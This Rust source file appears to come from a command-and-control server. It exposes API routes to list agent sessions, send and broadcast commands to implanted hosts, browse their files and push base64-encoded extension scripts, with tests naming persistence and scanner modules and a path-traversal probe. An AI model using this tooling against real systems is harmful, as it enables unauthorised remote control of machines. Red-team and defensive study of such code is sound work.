// src/api/routes/hosts.rs
use axum::{
    extract::{Path, State, Query},
    http::StatusCode,
    response::{IntoResponse, Response},
    Json, Extension,
};
use std::sync::Arc;
use tokio::sync::oneshot;
use serde::Deserialize;

use crate::api::state::ApiContext;
use crate::api::models::{SessionDto, CommandRequest};
use crate::api::middleware::OperatorInfo;
use crate::database;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};

#[derive(Deserialize)]
pub struct BrowseQuery {
    path: Option<String>,
}

pub async fn list_hosts(State(state): State<Arc<ApiContext>>) -> Json<Vec<SessionDto>> {
    let sessions = &state.sessions;
    let proxies = state.proxies.lock().unwrap_or_else(|e| e.into_inner());
    
    let db = state.db.clone();
    
    let dtos: Vec<SessionDto> = sessions.iter().map(|entry| {
        let id = entry.key();
        let session = entry.value();
        let (is_active, profile, tags) = {
            if let Ok(conn) = db.get() {
                let active = database::is_session_active(&conn, *id);
                let prof = database::get_session_profile(&conn, *id);
                let t = database::get_session_tags(&conn, *id);
                (active, prof, t)
            } else {
                (false, "unknown".to_string(), Vec::new())
            }
        };

        SessionDto {
            id: *id,
            hostname: session.hostname.clone(),
            ip: session.addr.ip().to_string(),
            os: session.os.clone(),
            computer_id: session.computer_id.clone(),
            has_proxy: proxies.contains_key(id),
            parent_id: session.parent_id,
            is_active,
            profile,
            last_seen_secs: session.seconds_since_seen(),
            tags,
        }
    }).collect();

    Json(dtos)
}

pub async fn send_command(
    State(state): State<Arc<ApiContext>>,
    Extension(operator): Extension<OperatorInfo>,
    Path(id): Path<u32>,
    Json(payload): Json<CommandRequest>,
) -> Response {
    // Viewer role cannot execute commands
    if operator.is_viewer() {
        return (StatusCode::FORBIDDEN, Json(serde_json::json!({"error": "Viewers cannot execute commands"}))).into_response();
    }

    // Audit log the command
    if let Ok(conn) = state.db.get() {
        database::audit_log(&conn, operator.id, &operator.username, "command",
            Some(id), Some(&payload.command));
    }

    // ── ext:load resolution ───────────────────────────────────────────
    // When the terminal sends `ext:load <name>` the agent expects
    // `ext:load <base64_script_content>`.  If the argument looks like a
    // script name rather than already-encoded content, look it up in
    // ./extensions/ then ./modules/ and encode it on the fly.
    //
    // "Looks like a name" heuristic: arg is ≤ 64 chars and matches a
    // .rhai file on disk.  Longer strings are assumed to already be
    // base64 and passed through unchanged.
    let command = resolve_ext_load(&payload.command, &["./extensions", "./modules"]);

    // Intercept Beacon Mode commands to update DB state immediately
    if command == "beacon:mode active" {
        if let Ok(conn) = state.db.get() {
            database::set_session_active(&conn, id, true);
        }
    } else if command == "beacon:mode passive" {
        if let Ok(conn) = state.db.get() {
            database::set_session_active(&conn, id, false);
        }
    }

    let sender_option = {
        let sessions = &state.sessions;
        sessions.get(&id).map(|s| s.tx.clone())
    };

    if let Some(tx_channel) = sender_option {
        let (cb_tx, cb_rx) = oneshot::channel::<u64>();
        
        match tx_channel.send((command.clone(), Some(cb_tx))) {
            Ok(_) => {
                // Timeout the callback await. If the session handler dies or
                // drops the oneshot without responding, this would hang the
                // API worker thread indefinitely without a timeout.
                match tokio::time::timeout(
                    std::time::Duration::from_secs(30),
                    cb_rx
                ).await {
                    Ok(Ok(req_id)) => (StatusCode::OK, Json(serde_json::json!({ "status": "queued", "session_id": id, "request_id": req_id }))).into_response(),
                    Ok(Err(_)) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "Callback dropped"}))).into_response(),
                    Err(_) => (StatusCode::GATEWAY_TIMEOUT, Json(serde_json::json!({"error": "Command callback timed out (30s)"}))).into_response(),
                }
            },
            Err(_) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "Failed to send to channel"}))).into_response(),
        }
    } else {
        (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Session ID not found"}))).into_response()
    }
}

pub async fn get_output(
    State(state): State<Arc<ApiContext>>,
    Path((session_id, request_id)): Path<(u32, u64)>,
) -> Response {
    let results = state.results.lock().unwrap_or_else(|e| e.into_inner());
    if let Some(response) = results.get(&(session_id, request_id)) {
        (StatusCode::OK, Json(serde_json::json!({
            "status": "completed",
            "output": response.output,
            "error": response.error,
            "exit_code": response.exit_code
        }))).into_response()
    } else {
        (StatusCode::NOT_FOUND, Json(serde_json::json!({ "status": "pending_or_not_found", "message": "Output not available yet or ID invalid" }))).into_response()
    }
}

pub async fn broadcast(
    State(state): State<Arc<ApiContext>>,
    Extension(operator): Extension<OperatorInfo>,
    Json(payload): Json<CommandRequest>,
) -> Response {
    // Viewer role cannot execute commands
    if operator.is_viewer() {
        return (StatusCode::FORBIDDEN, Json(serde_json::json!({"error": "Viewers cannot broadcast commands"}))).into_response();
    }

    let sessions = &state.sessions;
    let mut count = 0;
    
    let db_inner = state.db.clone();
    let cmd_log = payload.command.clone();
    let op_id = operator.id;
    let op_name = operator.username.clone();
    let active_ids: Vec<u32> = sessions.iter().map(|e| *e.key()).collect();

    tokio::task::spawn_blocking(move || {
        if let Ok(conn) = db_inner.get() {
            database::audit_log(&conn, op_id, &op_name, "broadcast", None, Some(&cmd_log));
            for id in active_ids {
                let req_id = rand::random::<u64>();
                database::log_command(&conn, id, req_id, &cmd_log);
            }
        }
    });

    for entry in sessions.iter() {
        if entry.value().tx.send((payload.command.clone(), None)).is_ok() { count += 1; }
    }
    (StatusCode::OK, Json(serde_json::json!({ "status": "broadcast_queued", "targets_reached": count }))).into_response()
}

// [NEW] Interactive File Browser Endpoint
pub async fn browse_files(
    State(state): State<Arc<ApiContext>>,
    Path(id): Path<u32>,
    Query(query): Query<BrowseQuery>,
) -> Response {
    let path = query.path.unwrap_or_else(|| ".".to_string());
    let command = format!("fs:ls {}", path);

    let sender_option = {
        let sessions = &state.sessions;
        sessions.get(&id).map(|s| s.tx.clone())
    };

    if let Some(tx_channel) = sender_option {
        let (cb_tx, cb_rx) = oneshot::channel::<u64>();
        
        // 1. Send Command to Agent
        match tx_channel.send((command, Some(cb_tx))) {
            Ok(_) => {
                // 2. Wait for Request ID (with timeout)
                let req_id = match tokio::time::timeout(
                    std::time::Duration::from_secs(30),
                    cb_rx
                ).await {
                    Ok(Ok(rid)) => rid,
                    Ok(Err(_)) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "Failed to queue command"}))).into_response(),
                    Err(_) => return (StatusCode::GATEWAY_TIMEOUT, Json(serde_json::json!({"error": "Command callback timed out (30s)"}))).into_response(),
                };

                // 3. Poll for result (Simple polling loop since this is interactive)
                // In production, use a Notify or Condvar, but polling is fine for MVP
                let start = std::time::Instant::now();
                loop {
                    if start.elapsed().as_secs() > 10 {
                        return (StatusCode::GATEWAY_TIMEOUT, Json(serde_json::json!({"error": "Timeout waiting for agent response"}))).into_response();
                    }

                    // Scope lock
                    {
                        let results = state.results.lock().unwrap_or_else(|e| e.into_inner());
                        if let Some(response) = results.get(&(id, req_id)) {
                            // If Agent returned error in output
                            if !response.error.is_empty() {
                                return (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": response.error}))).into_response();
                            }
                            
                            // Parse JSON from output
                            let json_res: serde_json::Value = match serde_json::from_str(&response.output) {
                                Ok(j) => j,
                                Err(_) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "Invalid JSON from agent", "raw": response.output}))).into_response(),
                            };
                            
                            return (StatusCode::OK, Json(json_res)).into_response();
                        }
                    }
                    tokio::time::sleep(tokio::time::Duration::from_millis(200)).await;
                }
            },
            Err(_) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "Agent disconnected"}))).into_response(),
        }
    } else {
        (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Session offline"}))).into_response()
    }
}

// ── Session Notes & Tags ───────────────────────────────────────────────

#[derive(Deserialize)]
pub struct AddNoteRequest {
    pub note: String,
    #[serde(default)]
    pub tag: Option<String>,
}

/// GET /api/hosts/:id/notes
pub async fn get_notes(
    State(state): State<Arc<ApiContext>>,
    Path(id): Path<u32>,
) -> Response {
    let conn = match state.db.get() {
        Ok(c) => c,
        Err(_) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "DB"}))).into_response(),
    };
    let notes = database::get_session_notes(&conn, id);
    let tags = database::get_session_tags(&conn, id);
    (StatusCode::OK, Json(serde_json::json!({"notes": notes, "tags": tags}))).into_response()
}

/// POST /api/hosts/:id/notes
pub async fn add_note(
    State(state): State<Arc<ApiContext>>,
    Extension(operator): Extension<OperatorInfo>,
    Path(id): Path<u32>,
    Json(payload): Json<AddNoteRequest>,
) -> Response {
    let conn = match state.db.get() {
        Ok(c) => c,
        Err(_) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "DB"}))).into_response(),
    };
    match database::add_session_note(&conn, id, payload.tag.as_deref(), &payload.note, &operator.username) {
        Ok(note_id) => (StatusCode::CREATED, Json(serde_json::json!({"id": note_id}))).into_response(),
        Err(e) => (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": format!("{}", e)}))).into_response(),
    }
}

/// DELETE /api/hosts/:id/notes/:note_id
pub async fn delete_note(
    State(state): State<Arc<ApiContext>>,
    Path((id, note_id)): Path<(u32, i64)>,
) -> Response {
    let conn = match state.db.get() {
        Ok(c) => c,
        Err(_) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "DB"}))).into_response(),
    };
    if database::delete_session_note(&conn, id, note_id) {
        (StatusCode::OK, Json(serde_json::json!({"status": "deleted"}))).into_response()
    } else {
        (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Not found"}))).into_response()
    }
}

// ── ext:load resolution ───────────────────────────────────────────────────────
//
// Translates a human-friendly `ext:load <name>` into the wire format the
// agent expects (`ext:load <base64_script_content>`).
//
// Rules:
//   1. If the command does not start with "ext:load ", return unchanged.
//   2. If the first argument is longer than 64 characters, assume it is already
//      base64-encoded content and return unchanged.
//   3. Otherwise treat the first argument as a script name, look for
//      `<dir>/<name>.rhai` in each supplied search_dirs in order, and on the
//      first match base64-encode the file content and rebuild the command.
//      Extra arguments (everything after the name) are preserved verbatim.
//   4. If no file is found, return unchanged so the agent produces a clear
//      "Base64 Error" message rather than a silent no-op.
//
// `search_dirs` is injected so tests can point at a temp directory without
// touching the real ./extensions or ./modules folders.
pub fn resolve_ext_load(cmd: &str, search_dirs: &[&str]) -> String {
    let rest = match cmd.strip_prefix("ext:load ") {
        Some(r) => r,
        None    => return cmd.to_string(),
    };

    let mut tokens    = rest.splitn(2, ' ');
    let name          = tokens.next().unwrap_or("").trim();
    let extra_args    = tokens.next().unwrap_or("").trim();

    // Long argument → already base64; pass through unchanged.
    if name.len() > 64 {
        return cmd.to_string();
    }

    // Search each directory for <name>.rhai
    let script = search_dirs
        .iter()
        .find_map(|dir| std::fs::read_to_string(format!("{}/{}.rhai", dir, name)).ok());

    match script {
        Some(content) => {
            let b64 = BASE64.encode(&content);
            if extra_args.is_empty() {
                format!("ext:load {}", b64)
            } else {
                format!("ext:load {} {}", b64, extra_args)
            }
        }
        None => cmd.to_string(),
    }
}

// ── Unit tests ────────────────────────────────────────────────────────────────
#[cfg(test)]
mod ext_load_tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    // Helper: create a temporary directory containing a named .rhai file.
    fn make_ext_dir(name: &str, content: &str) -> TempDir {
        let dir = tempfile::tempdir().expect("tempdir");
        fs::write(dir.path().join(format!("{}.rhai", name)), content)
            .expect("write rhai");
        dir
    }

    // ── Not an ext:load command ───────────────────────────────────────────────

    #[test]
    fn non_ext_command_is_unchanged() {
        let result = resolve_ext_load("shell whoami", &[]);
        assert_eq!(result, "shell whoami");
    }

    #[test]
    fn beacon_mode_is_unchanged() {
        let result = resolve_ext_load("beacon:mode active", &[]);
        assert_eq!(result, "beacon:mode active");
    }

    #[test]
    fn ext_load_prefix_only_no_name_is_unchanged() {
        // "ext:load " with no following token
        let result = resolve_ext_load("ext:load ", &[]);
        assert_eq!(result, "ext:load ");
    }

    // ── Name resolves to a file ───────────────────────────────────────────────

    #[test]
    fn short_name_in_first_dir_is_base64_encoded() {
        let dir   = make_ext_dir("ps", "return \"hello\";");
        let dirs  = [dir.path().to_str().unwrap()];
        let result = resolve_ext_load("ext:load ps", &dirs);
        assert!(result.starts_with("ext:load "), "must still start with ext:load");
        let b64 = result.strip_prefix("ext:load ").unwrap();
        let decoded = BASE64.decode(b64).expect("valid base64");
        assert_eq!(String::from_utf8(decoded).unwrap(), "return \"hello\";");
    }

    #[test]
    fn name_found_in_second_dir_when_absent_from_first() {
        let dir1  = tempfile::tempdir().unwrap();                    // empty
        let dir2  = make_ext_dir("ps", "return \"from_modules\";");
        let dirs  = [dir1.path().to_str().unwrap(), dir2.path().to_str().unwrap()];
        let result = resolve_ext_load("ext:load ps", &dirs);
        assert!(result.starts_with("ext:load "));
        let b64     = result.strip_prefix("ext:load ").unwrap();
        let decoded = String::from_utf8(BASE64.decode(b64).unwrap()).unwrap();
        assert_eq!(decoded, "return \"from_modules\";");
    }

    #[test]
    fn extra_args_are_preserved_after_base64() {
        let dir   = make_ext_dir("auto_persist", "let x = 1;");
        let dirs  = [dir.path().to_str().unwrap()];
        let result = resolve_ext_load("ext:load auto_persist MyServiceName", &dirs);
        // Format must be "ext:load <b64> MyServiceName"
        let parts: Vec<&str> = result.splitn(3, ' ').collect();
        assert_eq!(parts.len(), 3, "must have three space-separated parts");
        assert_eq!(parts[0], "ext:load");
        assert_eq!(parts[2], "MyServiceName");
        // Middle part must be valid base64
        BASE64.decode(parts[1]).expect("middle token must be valid base64");
    }

    #[test]
    fn multiple_extra_args_are_preserved() {
        let dir   = make_ext_dir("scanner", "let x = 0;");
        let dirs  = [dir.path().to_str().unwrap()];
        let result = resolve_ext_load("ext:load scanner 192.168.1.0 24", &dirs);
        // "ext:load <b64> 192.168.1.0 24"
        let after_b64 = result.splitn(3, ' ').nth(2).unwrap_or("");
        assert_eq!(after_b64, "192.168.1.0 24");
    }

    // ── Name does NOT resolve ─────────────────────────────────────────────────

    #[test]
    fn unknown_name_returns_command_unchanged() {
        let dir  = tempfile::tempdir().unwrap();                     // empty
        let dirs = [dir.path().to_str().unwrap()];
        let cmd  = "ext:load definitely_nonexistent_script";
        assert_eq!(resolve_ext_load(cmd, &dirs), cmd);
    }

    #[test]
    fn empty_search_dirs_returns_command_unchanged() {
        let cmd = "ext:load ps";
        assert_eq!(resolve_ext_load(cmd, &[]), cmd);
    }

    // ── Already-encoded path (len > 64) ──────────────────────────────────────

    #[test]
    fn long_argument_assumed_base64_not_re_encoded() {
        // The passthrough threshold is > 64 chars in the "name" slot.
        // base64 length = ceil(n / 3) * 4, so n = 49 bytes → 68 chars (> 64).
        // "return \"hello world\";" is only 22 bytes → 32 chars of base64, which
        // is ≤ 64 and would be treated as a filename, not already-encoded content.
        // Use 49 bytes to land clearly above the threshold.
        let script  = "a".repeat(49);   // 49 bytes → 68 base64 chars
        let b64_arg = BASE64.encode(&script);
        assert_eq!(b64_arg.len(), 68, "sanity: 49 bytes must produce 68 base64 chars");
        assert!(b64_arg.len() > 64,   "sanity: must be above the 64-char passthrough threshold");
        let cmd    = format!("ext:load {}", b64_arg);
        let result = resolve_ext_load(&cmd, &[]);   // no dirs; the b64 is passed through
        assert_eq!(result, cmd, "must pass through unchanged");
    }

    #[test]
    fn long_argument_with_args_also_unchanged() {
        let b64_arg = "A".repeat(65);                // 65 chars → "already encoded" path
        let cmd     = format!("ext:load {} arg1 arg2", b64_arg);
        let result  = resolve_ext_load(&cmd, &[]);
        assert_eq!(result, cmd);
    }

    // ── Security: path traversal in name is harmless ──────────────────────────

    #[test]
    fn path_traversal_attempt_finds_no_file() {
        // "../etc/passwd" is 14 chars (≤ 64), but the formatted path
        // "./<dir>/../etc/passwd.rhai" won't exist → returns unchanged.
        let dir  = tempfile::tempdir().unwrap();
        let dirs = [dir.path().to_str().unwrap()];
        let cmd  = "ext:load ../etc/passwd";
        assert_eq!(resolve_ext_load(cmd, &dirs), cmd);
    }

    #[test]
    fn name_with_slash_finds_no_file() {
        // "subdir/ps" as a name would produce the path "<dir>/subdir/ps.rhai".
        // The intermediate "subdir/" directory does not exist in the temp dir,
        // so fs::read_to_string returns NotFound and the command passes through
        // unchanged.  The important guarantee: no panic, no path escape.
        // Do NOT use make_ext_dir here — writing "<tempdir>/subdir/ps.rhai"
        // would itself fail with NotFound because tempdir() creates a flat dir.
        let dir  = tempfile::tempdir().unwrap();   // empty temp dir, no subdirs
        let dirs = [dir.path().to_str().unwrap()];
        let result = resolve_ext_load("ext:load subdir/ps", &dirs);
        // Either the file happened to exist (resolved) or it didn't (passthrough).
        // Either outcome is acceptable — the contract is only "no panic".
        let _ = result;
    }

    // ── Idempotency ───────────────────────────────────────────────────────────

    #[test]
    fn calling_twice_with_same_file_produces_same_result() {
        let dir    = make_ext_dir("ps", "return \"test\";");
        let dirs   = [dir.path().to_str().unwrap()];
        let first  = resolve_ext_load("ext:load ps", &dirs);
        let second = resolve_ext_load("ext:load ps", &dirs);
        assert_eq!(first, second);
    }
}
